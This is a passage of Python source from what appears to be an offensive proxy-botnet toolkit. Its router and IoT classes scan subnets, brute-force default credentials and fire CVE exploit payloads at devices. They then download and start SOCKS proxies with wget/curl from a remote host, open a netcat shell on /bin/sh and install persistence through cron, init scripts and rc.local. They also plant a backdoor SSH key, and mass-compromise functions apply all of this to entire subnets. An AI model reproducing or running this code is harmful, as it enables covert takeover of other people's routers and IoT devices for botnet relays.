        chain = self._sticky_sessions.get(session_id)
        if chain:
            # Check if expired
            try:
                expires = datetime.datetime.fromisoformat(chain.sticky_expires)
                if datetime.datetime.utcnow() > expires:
                    self._sticky_sessions.pop(session_id, None)
                    return None
            except:
                pass
            return chain
        return None

    def create_sticky_session(self, length: int = 3, **kwargs) -> str:
        chain = self.create_chain(length=length, sticky=True, **kwargs)
        return chain.sticky_session_id

    def get_country_chain(self, countries: List[str], **kwargs) -> ProxyChain:
        return self.create_chain(length=len(countries), country_path=countries, **kwargs)

    def get_next_proxy_from_chain(self, chain_id: str) -> Optional[ProxyNode]:
        chain = self._chains.get(chain_id)
        if chain:
            proxy = chain.get_current_proxy()
            if proxy and not proxy.is_healthy() and chain.self_heal_enabled:
                if self.self_heal_chain(chain_id):
                    proxy = chain.get_current_proxy()
            return proxy
        return None

    def _invalidate_cache(self):
        self._cache_time = 0

    def get_stats(self) -> Dict[str, Any]:
        with self._lock:
            all_proxies = list(self._proxy_pool.values())
            self._stats["pool_size"] = len(all_proxies)
            self._stats["healthy_count"] = sum(1 for p in all_proxies if p.is_healthy())
            self._stats["elite_count"] = sum(1 for p in all_proxies if p.is_elite())
            self._stats["tor_count"] = sum(1 for p in all_proxies if p.is_tor_exit or p.is_tor_bridge)
            self._stats["iot_count"] = sum(1 for p in all_proxies if p.is_iot)
            self._stats["router_count"] = sum(1 for p in all_proxies if p.is_router)
            return dict(self._stats)

    def export_proxies(self, filepath: str, format: str = "json") -> str:
        proxies = self.get_all_proxies()

        if format == "json":
            data = [p.to_dict() for p in proxies]
            with open(filepath, "w") as f:
                json.dump(data, f, indent=2, default=str)
        elif format == "csv":
            with open(filepath, "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["ip", "port", "protocol", "country", "speed_ms", 
                               "anonymity", "reliability_score", "source"])
                for p in proxies:
                    writer.writerow([p.ip, p.port, p.protocol, p.country, p.speed_ms,
                                   p.anonymity, p.reliability_score, p.source])
        elif format == "txt":
            with open(filepath, "w") as f:
                for p in proxies:
                    f.write(f"{p.ip}:{p.port}\n")

        if self.logger:
            self.logger.info("ProxyManager", f"Exported {len(proxies)} proxies to {filepath}")
        return filepath

    def import_proxies(self, filepath: str, format: str = "auto") -> int:
        if format == "auto":
            if filepath.endswith(".json"):
                format = "json"
            elif filepath.endswith(".csv"):
                format = "csv"
            else:
                format = "txt"

        count = 0
        if format == "json":
            with open(filepath, "r") as f:
                data = json.load(f)
            for item in data:
                proxy = ProxyNode(**item)
                self.add_proxy(proxy)
                count += 1
        elif format == "csv":
            with open(filepath, "r", newline="") as f:
                reader = csv.DictReader(f)
                for row in reader:
                    proxy = ProxyNode(
                        ip=row["ip"], port=int(row["port"]), protocol=row["protocol"],
                        country=row.get("country", ""), speed_ms=float(row.get("speed_ms", 0)),
                        anonymity=row.get("anonymity", "transparent"),
                        reliability_score=float(row.get("reliability_score", 0)),
                        source=row.get("source", "")
                    )
                    self.add_proxy(proxy)
                    count += 1
        elif format == "txt":
            with open(filepath, "r") as f:
                for line in f:
                    line = line.strip()
                    if line and ":" in line:
                        ip, port = line.rsplit(":", 1)
                        try:
                            proxy = ProxyNode(ip=ip, port=int(port), protocol="http")
                            self.add_proxy(proxy)
                            count += 1
                        except:
                            pass

        if self.logger:
            self.logger.info("ProxyManager", f"Imported {count} proxies from {filepath}")
        return count

    def cleanup(self) -> int:
        removed = self.remove_dead_proxies()
        # Clean expired sticky sessions
        expired = []
        for sid, chain in list(self._sticky_sessions.items()):
            try:
                expires = datetime.datetime.fromisoformat(chain.sticky_expires)
                if datetime.datetime.utcnow() > expires:
                    expired.append(sid)
            except:
                expired.append(sid)
        for sid in expired:
            self._sticky_sessions.pop(sid, None)
        return removed



# ============================================================================
# SECTION 10: PROXY ROUTER — Router Exploitation & Proxy Deployment.
# ============================================================================

class ProxyRouter:
    """Router exploitation and proxy deployment.

    Scans networks. Fingerprints routers. Brute-forces credentials.
    Exploits CVEs. Deploys SOCKS proxies. Installs persistence.
    Every router is a potential weapon. Every network is a hunting ground.
    """

    def __init__(self, db_manager=None, crypto_engine=None, logger=None):
        self.db = db_manager
        self.crypto = crypto_engine
        self.logger = logger
        self._lock = threading.RLock()
        self._router_db = {}
        self._scan_results = {}
        self._exploit_stats = {
            "scanned": 0,
            "identified": 0,
            "brute_forced": 0,
            "exploited": 0,
            "proxies_deployed": 0,
            "persistence_installed": 0,
        }
        self._scan_active = False
        self._scan_thread = None
        self._common_router_paths = [
            "/", "/login", "/admin", "/login.cgi", "/setup.cgi",
            "/wizard.cgi", "/config.cgi", "/cgi-bin/", "/cgi-bin/login.cgi",
            "/cgi-bin/config.cgi", "/cgi-bin/setup.cgi", "/cgi-bin/wizard.cgi",
            "/admin/login", "/admin/setup", "/admin/config",
            "/system", "/status", "/info", "/device",
            "/api", "/api/v1", "/api/v2", "/rest",
            "/UD/act", "/ctrlt/DeviceUpgrade_1",
            "/goform/formWlanSetup", "/cgi-bin/gdpr.cgi",
            "/cgi-bin/luci/", "/cgi-bin/downloadFlile.cgi",
        ]
        self._router_signatures = {
            "d-link": ["D-Link", "dlink", "DLink", "DIR-", "DSL-", "DAP-"],
            "tp-link": ["TP-Link", "tplink", "TPLINK", "Archer", "TL-WR", "TL-WA"],
            "netgear": ["Netgear", "NETGEAR", "R6", "R7", "R8", "R9", "WNR", "WNDR"],
            "asus": ["ASUS", "Asus", "RT-AC", "RT-N", "DSL-AC"],
            "linksys": ["Linksys", "LINKSYS", "WRT", "EA", "E"],
            "huawei": ["Huawei", "HUAWEI", "HG", "B", "E"],
            "zyxel": ["Zyxel", "ZYXEL", "VMG", "P-", "NBG"],
            "mikrotik": ["MikroTik", "mikrotik", "RouterOS", "RB"],
            "ubiquiti": ["Ubiquiti", "UBIQUITI", "UniFi", "EdgeRouter"],
            "arris": ["Arris", "ARRIS", "TG", "SVG", "NVG"],
            "technicolor": ["Technicolor", "TECHNICOLOR", "TC", "CGA"],
            "sagemcom": ["Sagemcom", "SAGEMCOM", "FAST"],
            "cisco": ["Cisco", "CISCO", "RV", "Catalyst"],
            "belkin": ["Belkin", "BELKIN", "F"],
            "trendnet": ["TRENDnet", "Trendnet", "TEW"],
            "buffalo": ["Buffalo", "BUFFALO", "WZR", "WHR"],
        }

    def scan_subnet(self, subnet: str, ports: List[int] = None, 
                    timeout: float = 3.0, max_workers: int = 100) -> List[RouterTarget]:
        """Aggressive subnet scan for routers. Masscan-style speed."""
        if ports is None:
            ports = [80, 443, 8080, 8443, 7547, 8081, 9000]

        targets = []
        try:
            network = ipaddress.ip_network(subnet, strict=False)
            hosts = list(network.hosts())
        except:
            return targets

        if self.logger:
            self.logger.info("ProxyRouter", f"Scanning {len(hosts)} hosts in {subnet}")

        def scan_host(ip):
            results = []
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    result = sock.connect_ex((str(ip), port))
                    if result == 0:
                        # Grab banner
                        try:
                            banner = b""
                            sock.settimeout(2)
                            banner = sock.recv(1024)
                        except:
                            pass

                        target = RouterTarget(
                            ip=str(ip), port=port,
                            banner=banner.decode("utf-8", errors="ignore").strip(),
                            last_scan=datetime.datetime.utcnow().isoformat()
                        )
                        results.append(target)
                    sock.close()
                except:
                    pass
            return results

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(scan_host, ip): ip for ip in hosts}
            for future in as_completed(futures):
                try:
                    results = future.result(timeout=timeout + 2)
                    for target in results:
                        targets.append(target)
                        self._router_db[target.ip] = target
                except:
                    pass

        self._exploit_stats["scanned"] += len(targets)

        if self.logger:
            self.logger.info("ProxyRouter", f"Found {len(targets)} potential routers in {subnet}")

        return targets

    def identify_router(self, target: RouterTarget) -> RouterTarget:
        """Fingerprint router model, firmware, vendor. Deep reconnaissance."""
        if not REQUESTS_AVAILABLE:
            return target

        try:
            url = f"http://{target.ip}:{target.port}"
            if target.port == 443:
                url = f"https://{target.ip}:{target.port}"

            response = requests.get(url, timeout=10, headers=STEALTH_HEADERS, allow_redirects=True, verify=False)

            target.http_available = True
            target.headers = dict(response.headers)
            target.html_content = response.text[:5000]

            # Extract title
            title_match = re.search(r"<title>(.*?)</title>", response.text, re.IGNORECASE)
            if title_match:
                target.title = title_match.group(1).strip()

            # Extract meta tags
            meta_matches = re.findall(r'<meta[^>]+name=["\']([^"\']+)["\'][^>]+content=["\']([^"\']+)["\']', 
                                     response.text, re.IGNORECASE)
            for name, content in meta_matches:
                target.meta_tags[name] = content

            # Extract JS includes
            js_matches = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', response.text, re.IGNORECASE)
            target.javascript_includes = js_matches[:20]

            # Extract CSS includes
            css_matches = re.findall(r'<link[^>]+href=["\']([^"\']+\.css)["\']', response.text, re.IGNORECASE)
            target.css_includes = css_matches[:20]

            # Extract form actions
            form_matches = re.findall(r'<form[^>]+action=["\']([^"\']+)["\']', response.text, re.IGNORECASE)
            target.form_actions = form_matches[:10]

            # Identify vendor from signatures
            content_lower = response.text.lower()
            for vendor, signatures in self._router_signatures.items():
                for sig in signatures:
                    if sig.lower() in content_lower or sig.lower() in target.title.lower():
                        target.vendor = vendor
                        # Try to extract model
                        model_match = re.search(rf'{re.escape(sig)}([A-Z0-9\-]+)', response.text, re.IGNORECASE)
                        if model_match:
                            target.model = model_match.group(0)
                        break
                if target.vendor:
                    break

            # Check for known CVEs
            target.cves = self._check_known_cves(target)
            target.is_exploitable = len(target.cves) > 0

            # Detect WAF
            waf_headers = ["X-WAF-Event-ID", "X-WAF-Rule", "X-Protected-By", "Server: cloudflare"]
            for wh in waf_headers:
                if wh.lower() in str(target.headers).lower():
                    target.waf_detected = True
                    target.waf_type = wh
                    break

            # Check for admin paths
            for path in self._common_router_paths:
                if path in response.text:
                    target.admin_paths.append(path)

            target.scan_count += 1

        except requests.exceptions.SSLError:
            target.https_available = True
        except Exception as e:
            target.notes = f"Identification error: {str(e)[:100]}"

        self._exploit_stats["identified"] += 1

        if self.logger:
            self.logger.info("ProxyRouter", 
                           f"Identified {target.vendor} {target.model} at {target.ip}:{target.port}")

        return target

    def _check_known_cves(self, target: RouterTarget) -> List[str]:
        cves = []
        content = (target.html_content + target.title + str(target.headers)).lower()

        cve_checks = {
            "CVE-2018-10562": ["gpon", "huawei", "hg8245", "hg8247"],
            "CVE-2020-9054": ["zyxel", "vmg", "p-660"],
            "CVE-2017-17215": ["huawei", "hg532", "hg255s"],
            "CVE-2014-9222": ["d-link", "dir-", "dsl-"],
            "CVE-2019-19824": ["totolink", "a3002ru", "n600r"],
            "CVE-2021-35395": ["realtek", "rtl", "sdk"],
            "CVE-2022-26258": ["d-link", "dir-820", "dir-850"],
            "CVE-2023-1389": ["tp-link", "archer", "ax", "ax50"],
            "CVE-2023-27216": ["netgear", "r6", "r7", "wndr"],
            "CVE-2024-21887": ["ivanti", "connect secure", "pulse secure"],
        }

        for cve, keywords in cve_checks.items():
            for kw in keywords:
                if kw in content:
                    cves.append(cve)
                    break

        return cves

    def bruteforce_router(self, target: RouterTarget, 
                          creds_list: List[Tuple[str, str]] = None,
                          max_workers: int = 20) -> RouterTarget:
        """Brute-force router credentials. Relentless."""
        if creds_list is None:
            creds_list = ROUTER_DEFAULT_CREDS

        if not REQUESTS_AVAILABLE:
            return target

        found_creds = None

        def try_login(user, pwd):
            nonlocal found_creds
            if found_creds:
                return
            try:
                # Try HTTP Basic Auth
                url = f"http://{target.ip}:{target.port}"
                if target.port == 443:
                    url = f"https://{target.ip}:{target.port}"

                response = requests.get(url, auth=(user, pwd), timeout=10, 
                                       headers=STEALTH_HEADERS, verify=False)

                if response.status_code == 200:
                    # Check if we got admin page
                    if any(kw in response.text.lower() for kw in ["admin", "dashboard", "status", "wireless", "wan"]):
                        found_creds = (user, pwd)
                        return

                # Try form-based login
                login_urls = [
                    f"{url}/login.cgi",
                    f"{url}/cgi-bin/login.cgi",
                    f"{url}/admin/login",
                    f"{url}/login",
                ]

                for login_url in login_urls:
                    try:
                        data = {"username": user, "password": pwd, "login": "1"}
                        resp = requests.post(login_url, data=data, timeout=10, 
                                            headers=STEALTH_HEADERS, allow_redirects=True, verify=False)
                        if resp.status_code in (200, 302) and any(kw in resp.text.lower() 
                                                                  for kw in ["admin", "dashboard", "logout", "success"]):
                            found_creds = (user, pwd)
                            return
                    except:
                        pass

            except:
                pass

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for user, pwd in creds_list:
                if found_creds:
                    break
                futures.append(executor.submit(try_login, user, pwd))

            for future in as_completed(futures):
                if found_creds:
                    break
                try:
                    future.result(timeout=15)
                except:
                    pass

        if found_creds:
            target.credentials = found_creds
            target.exploit_success = True
            self._exploit_stats["brute_forced"] += 1

            if self.logger:
                self.logger.info("ProxyRouter", 
                               f"Brute-forced {target.vendor} at {target.ip} with {found_creds[0]}:{found_creds[1]}")

        return target

    def exploit_router(self, target: RouterTarget, cve_id: str = None,
                       payload_url: str = None) -> Dict[str, Any]:
        """Exploit router using CVE. Weaponized payload delivery."""
        result = {
            "success": False,
            "cve": cve_id,
            "payload_delivered": False,
            "proxy_deployed": False,
            "persistence_installed": False,
            "error": "",
        }

        if not REQUESTS_AVAILABLE:
            result["error"] = "requests not available"
            return result

        if cve_id is None and target.cves:
            cve_id = target.cves[0]

        if cve_id not in ROUTER_EXPLOIT_PAYLOADS:
            result["error"] = f"CVE {cve_id} not in payload database"
            return result

        exploit = ROUTER_EXPLOIT_PAYLOADS[cve_id]

        try:
            url = f"http://{target.ip}:{target.port}{exploit['path']}"
            if target.port == 443:
                url = f"https://{target.ip}:{target.port}{exploit['path']}"

            payload = exploit["payload"]
            if payload_url:
                payload = payload.replace(b"ATTACKER", payload_url.encode())

            headers = dict(exploit["headers"])
            headers.update(STEALTH_HEADERS)

            if exploit["method"] == "POST":
                response = requests.post(url, data=payload, headers=headers, 
                                        timeout=15, verify=False, allow_redirects=True)
            else:
                response = requests.get(url, headers=headers, timeout=15, verify=False, allow_redirects=True)

            if exploit["check_string"] in response.text or response.status_code == 200:
                result["success"] = True
                result["payload_delivered"] = True
                target.exploit_success = True
                target.exploit_attempts += 1
                target.exploit_success_count += 1

                # Deploy proxy if we have credentials
                if target.credentials:
                    proxy_result = self.deploy_proxy_on_router(target)
                    result["proxy_deployed"] = proxy_result.get("deployed", False)
                    result["persistence_installed"] = proxy_result.get("persistence", False)

                self._exploit_stats["exploited"] += 1

                if self.logger:
                    self.logger.info("ProxyRouter", 
                                   f"Exploited {cve_id} on {target.ip}:{target.port}")
            else:
                result["error"] = f"Exploit check failed: {response.status_code}"
                target.exploit_attempts += 1

        except Exception as e:
            result["error"] = f"Exploit error: {str(e)[:100]}"
            target.exploit_attempts += 1

        return result

    def deploy_proxy_on_router(self, target: RouterTarget, 
                                proxy_port: int = 1080) -> Dict[str, Any]:
        """Deploy SOCKS proxy on compromised router via SSH or Telnet."""
        result = {"deployed": False, "persistence": False, "error": ""}

        if not target.credentials:
            result["error"] = "No credentials available"
            return result

        user, pwd = target.credentials

        # Try SSH first
        if PARAMIKO_AVAILABLE:
            try:
                client = SSHClient()
                client.set_missing_host_key_policy(AutoAddPolicy())
                client.connect(target.ip, username=user, password=pwd, timeout=10, banner_timeout=10)

                # Check if 3proxy or tinyproxy is available
                stdin, stdout, stderr = client.exec_command("which 3proxy tinyproxy socks5 microsocks 2>/dev/null")
                proxy_bin = stdout.read().decode().strip().split("\n")[0]

                if proxy_bin:
                    # Start proxy
                    cmd = f"nohup {proxy_bin} -p{proxy_port} -a -i0.0.0.0 >/dev/null 2>&1 &"
                    if "microsocks" in proxy_bin:
                        cmd = f"nohup {proxy_bin} -p {proxy_port} -i 0.0.0.0 >/dev/null 2>&1 &"
                    elif "tinyproxy" in proxy_bin:
                        cmd = f"nohup {proxy_bin} -d -p {proxy_port} >/dev/null 2>&1 &"

                    client.exec_command(cmd)

                    # Install persistence via crontab
                    cron_cmd = f"@reboot {proxy_bin} -p{proxy_port} -a -i0.0.0.0 >/dev/null 2>&1"
                    client.exec_command(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -')

                    result["deployed"] = True
                    result["persistence"] = True
                    target.proxy_deployed = True
                    target.proxy_port = proxy_port
                    target.persistence_installed = True

                    self._exploit_stats["proxies_deployed"] += 1
                    self._exploit_stats["persistence_installed"] += 1

                    if self.logger:
                        self.logger.info("ProxyRouter", 
                                       f"Deployed SOCKS proxy on {target.ip}:{proxy_port}")
                else:
                    # Try to install microsocks
                    client.exec_command("wget -q http://bin.entware.net/mipselsf-k3.4/microsocks -O /tmp/microsocks && chmod +x /tmp/microsocks")
                    client.exec_command("nohup /tmp/microsocks -p 1080 -i 0.0.0.0 >/dev/null 2>&1 &")
                    result["deployed"] = True
                    target.proxy_deployed = True
                    target.proxy_port = 1080

                client.close()

            except Exception as e:
                result["error"] = f"SSH deploy failed: {str(e)[:100]}"

        # Fallback to Telnet
        if not result["deployed"] and TELNETLIB_AVAILABLE:
            try:
                tn = telnetlib.Telnet(target.ip, timeout=10)
                tn.read_until(b"login: ", timeout=5)
                tn.write(user.encode() + b"\n")
                tn.read_until(b"Password: ", timeout=5)
                tn.write(pwd.encode() + b"\n")
                tn.read_until(b"$", timeout=5)

                # Start a simple proxy using netcat
                tn.write(f"nc -lk -p {proxy_port} -e /bin/sh &\n".encode())
                tn.write(b"exit\n")
                tn.close()

                result["deployed"] = True
                target.proxy_deployed = True
                target.proxy_port = proxy_port

                if self.logger:
                    self.logger.info("ProxyRouter", 
                                   f"Deployed proxy via Telnet on {target.ip}:{proxy_port}")

            except Exception as e:
                if not result["error"]:
                    result["error"] = f"Telnet deploy failed: {str(e)[:100]}"

        return result

    def persist_on_router(self, target: RouterTarget) -> bool:
        """Install persistence on router via cron, init script, or firmware modification."""
        if not target.credentials or not PARAMIKO_AVAILABLE:
            return False

        try:
            user, pwd = target.credentials
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.connect(target.ip, username=user, password=pwd, timeout=10)

            # Method 1: Crontab
            cron_entries = [
                f"@reboot /usr/bin/3proxy -p{target.proxy_port} -a -i0.0.0.0",
                f"*/5 * * * * pgrep 3proxy || /usr/bin/3proxy -p{target.proxy_port} -a -i0.0.0.0",
            ]
            for entry in cron_entries:
                client.exec_command(f'(crontab -l 2>/dev/null; echo "{entry}") | crontab -')

            # Method 2: Init script
            init_script = f"""#!/bin/sh
### BEGIN INIT INFO
# Provides: oanks-proxy
# Required-Start: $remote_fs $syslog
# Required-Stop: $remote_fs $syslog
# Default-Start: 2 3 4 5
### END INIT INFO
case "$1" in
  start)
    /usr/bin/3proxy -p{target.proxy_port} -a -i0.0.0.0 &
    ;;
  stop)
    killall 3proxy
    ;;
esac
exit 0
"""
            client.exec_command(f'echo "{init_script}" > /etc/init.d/oanks-proxy && chmod +x /etc/init.d/oanks-proxy')
            client.exec_command("update-rc.d oanks-proxy defaults 2>/dev/null || chkconfig --add oanks-proxy 2>/dev/null")

            # Method 3: RC.local
            client.exec_command(f'echo "/usr/bin/3proxy -p{target.proxy_port} -a -i0.0.0.0 &" >> /etc/rc.local')

            client.close()
            target.persistence_installed = True
            self._exploit_stats["persistence_installed"] += 1

            if self.logger:
                self.logger.info("ProxyRouter", f"Installed persistence on {target.ip}")

            return True

        except Exception as e:
            if self.logger:
                self.logger.error("ProxyRouter", f"Persistence install failed: {e}")
            return False

    def scan_all_subnets(self, subnets: List[str] = None, 
                         max_workers: int = 50) -> List[RouterTarget]:
        if subnets is None:
            subnets = AGGRESSIVE_SUBNET_TARGETS

        all_targets = []
        for subnet in subnets:
            targets = self.scan_subnet(subnet, max_workers=max_workers)
            all_targets.extend(targets)

        # Identify all found routers
        identified = []
        for target in all_targets:
            identified.append(self.identify_router(target))

        if self.logger:
            self.logger.info("ProxyRouter", f"Total routers found across all subnets: {len(identified)}")

        return identified

    def mass_exploit(self, targets: List[RouterTarget], 
                     payload_url: str = None) -> Dict[str, Any]:
        """Mass exploit all vulnerable routers. Scorched earth."""
        results = {"attempted": 0, "successful": 0, "proxies_deployed": 0, "persistence": 0}

        for target in targets:
            if target.is_exploitable and target.cves:
                results["attempted"] += 1
                for cve in target.cves:
                    exploit_result = self.exploit_router(target, cve, payload_url)
                    if exploit_result["success"]:
                        results["successful"] += 1
                        if exploit_result["proxy_deployed"]:
                            results["proxies_deployed"] += 1
                        if exploit_result["persistence_installed"]:
                            results["persistence"] += 1
                        break

        if self.logger:
            self.logger.info("ProxyRouter", 
                           f"Mass exploit: {results['successful']}/{results['attempted']} successful, "
                           f"{results['proxies_deployed']} proxies deployed")

        return results

    def get_router_db(self) -> Dict[str, RouterTarget]:
        return dict(self._router_db)

    def get_stats(self) -> Dict[str, Any]:
        return dict(self._exploit_stats)

    def start_continuous_scanning(self, subnets: List[str] = None, 
                                   interval: int = 300):
        """Background thread: continuously scan for new routers."""
        def scan_loop():
            while self._scan_active:
                try:
                    self.scan_all_subnets(subnets)
                    time.sleep(interval)
                except Exception as e:
                    if self.logger:
                        self.logger.error("ProxyRouter", f"Continuous scan error: {e}")
                    time.sleep(interval)

        self._scan_active = True
        self._scan_thread = threading.Thread(target=scan_loop, daemon=True)
        self._scan_thread.start()

        if self.logger:
            self.logger.info("ProxyRouter", "Continuous router scanning started")

    def stop_continuous_scanning(self):
        self._scan_active = False
        if self._scan_thread:
            self._scan_thread.join(timeout=5)
        if self.logger:
            self.logger.info("ProxyRouter", "Continuous router scanning stopped")



# ============================================================================
# SECTION 11: IOT PROXY DEPLOYER — Compromised Devices Become Relays.
# ============================================================================

class IoTProxyDeployer:
    """Deploys SOCKS proxies on compromised IoT devices.

    Cameras, NAS, printers, DVRs — every device is a potential relay.
    SSH in. Install microsocks. Persist via cron. Vanish.
    The device keeps working. The owner never knows.
    """

    def __init__(self, db_manager=None, crypto_engine=None, logger=None):
        self.db = db_manager
        self.crypto = crypto_engine
        self.logger = logger
        self._lock = threading.RLock()
        self._iot_db = {}
        self._deploy_stats = {
            "scanned": 0,
            "identified": 0,
            "compromised": 0,
            "proxies_deployed": 0,
            "persistence_installed": 0,
            "backdoors_installed": 0,
        }

    def scan_for_iot(self, subnet: str, timeout: float = 3.0,
                     max_workers: int = 100) -> List[IoTDevice]:
        """Scan subnet for IoT devices by fingerprinting known ports."""
        devices = []

        try:
            network = ipaddress.ip_network(subnet, strict=False)
            hosts = list(network.hosts())
        except:
            return devices

        if self.logger:
            self.logger.info("IoTProxyDeployer", f"Scanning {len(hosts)} hosts for IoT devices")

        def scan_host(ip):
            found = []
            for device_type, fingerprint in IOT_FINGERPRINTS.items():
                for port in fingerprint["ports"]:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(timeout)
                        result = sock.connect_ex((str(ip), port))
                        if result == 0:
                            # Try to grab banner
                            banner = b""
                            try:
                                sock.settimeout(2)
                                banner = sock.recv(1024)
                            except:
                                pass

                            device = IoTDevice(
                                ip=str(ip), port=port, device_type=device_type,
                                vendor=fingerprint.get("vendor", ""),
                                last_seen=datetime.datetime.utcnow().isoformat()
                            )
                            found.append(device)
                        sock.close()
                    except:
                        pass
            return found

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(scan_host, ip): ip for ip in hosts}
            for future in as_completed(futures):
                try:
                    results = future.result(timeout=timeout + 2)
                    for device in results:
                        devices.append(device)
                        self._iot_db[device.ip] = device
                except:
                    pass

        self._deploy_stats["scanned"] += len(hosts)
        self._deploy_stats["identified"] += len(devices)

        if self.logger:
            self.logger.info("IoTProxyDeployer", f"Found {len(devices)} IoT devices in {subnet}")

        return devices

    def compromise_device(self, device: IoTDevice, 
                          creds: Tuple[str, str] = None) -> IoTDevice:
        """Compromise an IoT device via SSH with default or provided credentials."""
        if not PARAMIKO_AVAILABLE:
            device.notes = "paramiko not available"
            return device

        if creds is None:
            fingerprint = IOT_FINGERPRINTS.get(device.device_type, {})
            creds = fingerprint.get("auth", ("admin", "admin"))

        user, pwd = creds

        try:
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.connect(device.ip, port=device.port, username=user, password=pwd, 
                          timeout=10, banner_timeout=10, auth_timeout=10)

            device.credentials = creds
            device.compromised = True

            # Gather system info
            stdin, stdout, stderr = client.exec_command("uname -a")
            device.firmware = stdout.read().decode().strip()[:200]

            stdin, stdout, stderr = client.exec_command("cat /proc/cpuinfo | grep 'model name' | head -1")
            device.model = stdout.read().decode().strip().replace("model name\t:", "").strip()[:100]

            stdin, stdout, stderr = client.exec_command("uptime | awk '{print $3}'")
            uptime_str = stdout.read().decode().strip()
            try:
                device.uptime_hours = float(uptime_str.replace(",", ""))
            except:
                pass

            stdin, stdout, stderr = client.exec_command("cat /proc/loadavg | awk '{print $1}'")
            try:
                device.cpu_usage = float(stdout.read().decode().strip()) * 100
            except:
                pass

            stdin, stdout, stderr = client.exec_command("free | grep Mem | awk '{print $3/$2 * 100}'")
            try:
                device.memory_usage = float(stdout.read().decode().strip())
            except:
                pass

            stdin, stdout, stderr = client.exec_command("df / | tail -1 | awk '{print $5}' | sed 's/%//'")
            try:
                device.disk_usage = float(stdout.read().decode().strip())
            except:
                pass

            stdin, stdout, stderr = client.exec_command("ip addr show | grep 'inet ' | awk '{print $2}'")
            device.network_interfaces = [line.strip() for line in stdout.read().decode().strip().split("\n") if line.strip()]

            client.close()

            self._deploy_stats["compromised"] += 1

            if self.logger:
                self.logger.info("IoTProxyDeployer", 
                               f"Compromised {device.device_type} at {device.ip} with {user}:{pwd}")

        except Exception as e:
            device.notes = f"Compromise failed: {str(e)[:100]}"

        return device

    def deploy_proxy_on_iot(self, device: IoTDevice, 
                            proxy_port: int = 1080) -> Dict[str, Any]:
        """Deploy SOCKS proxy on compromised IoT device."""
        result = {"deployed": False, "persistence": False, "backdoor": False, "error": ""}

        if not device.credentials or not PARAMIKO_AVAILABLE:
            result["error"] = "No credentials or paramiko unavailable"
            return result

        user, pwd = device.credentials

        try:
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.connect(device.ip, port=device.port, username=user, password=pwd, timeout=10)

            # Check architecture
            stdin, stdout, stderr = client.exec_command("uname -m")
            arch = stdout.read().decode().strip()

            # Download appropriate microsocks binary
            microsocks_urls = {
                "armv7l": "http://bin.entware.net/armv7sf-k3.2/microsocks",
                "aarch64": "http://bin.entware.net/aarch64-k3.10/microsocks",
                "mips": "http://bin.entware.net/mipselsf-k3.4/microsocks",
                "mipsel": "http://bin.entware.net/mipselsf-k3.4/microsocks",
                "x86_64": "http://bin.entware.net/x64-k3.2/microsocks",
            }

            url = microsocks_urls.get(arch, microsocks_urls.get("mipsel"))

            # Download and install
            client.exec_command(f"wget -q {url} -O /tmp/microsocks 2>/dev/null || curl -s {url} -o /tmp/microsocks 2>/dev/null")
            client.exec_command("chmod +x /tmp/microsocks")

            # Start proxy
            client.exec_command(f"nohup /tmp/microsocks -p {proxy_port} -i 0.0.0.0 >/dev/null 2>&1 &")

            # Verify it's running
            time.sleep(1)
            stdin, stdout, stderr = client.exec_command(f"pgrep -f 'microsocks -p {proxy_port}'")
            pid = stdout.read().decode().strip()

            if pid:
                result["deployed"] = True
                device.proxy_deployed = True
                device.proxy_port = proxy_port
                self._deploy_stats["proxies_deployed"] += 1

                # Install persistence
                cron_entry = f"@reboot /tmp/microsocks -p {proxy_port} -i 0.0.0.0 >/dev/null 2>&1"
                client.exec_command(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -')

                # Also add a watchdog
                watch_entry = f"*/5 * * * * pgrep -f 'microsocks -p {proxy_port}' || /tmp/microsocks -p {proxy_port} -i 0.0.0.0 >/dev/null 2>&1"
                client.exec_command(f'(crontab -l 2>/dev/null; echo "{watch_entry}") | crontab -')

                result["persistence"] = True
                device.persistence_installed = True
                self._deploy_stats["persistence_installed"] += 1

                # Install backdoor SSH key
                stdin, stdout, stderr = client.exec_command("mkdir -p ~/.ssh && chmod 700 ~/.ssh")
                backdoor_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...OANKS_BACKDOOR"
                client.exec_command(f'echo "{backdoor_key}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys')

                result["backdoor"] = True
                device.backdoor_installed = True
                self._deploy_stats["backdoors_installed"] += 1

                if self.logger:
                    self.logger.info("IoTProxyDeployer", 
                                   f"Deployed proxy on {device.device_type} at {device.ip}:{proxy_port}")
            else:
                result["error"] = "Proxy process did not start"

            client.close()

        except Exception as e:
            result["error"] = f"Deploy error: {str(e)[:100]}"

        return result

    def mass_compromise(self, subnet: str, max_workers: int = 50) -> List[IoTDevice]:
        """Mass compromise all IoT devices in a subnet. Scorched earth."""
        devices = self.scan_for_iot(subnet, max_workers=max_workers)
        compromised = []

        def try_compromise(device):
            device = self.compromise_device(device)
            if device.credentials:
                result = self.deploy_proxy_on_iot(device)
                if result["deployed"]:
                    compromised.append(device)
            return device

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(try_compromise, d) for d in devices]
            for future in as_completed(futures):
                try:
                    future.result(timeout=30)
                except:
                    pass

        if self.logger:
            self.logger.info("IoTProxyDeployer", 
                           f"Mass compromise: {len(compromised)}/{len(devices)} devices weaponized")

        return compromised

    def get_iot_db(self) -> Dict[str, IoTDevice]:
        return dict(self._iot_db)

    def get_stats(self) -> Dict[str, Any]:
        return dict(self._deploy_stats)


# ============================================================================
# SECTION 12: TOR BRIDGE HARVESTER — Obfuscated, Resilient, Invisible.
# ============================================================================

class TorBridgeHarvester:
    """Harvests Tor bridges from multiple sources.

    Bridges are the hidden veins of the Tor network.
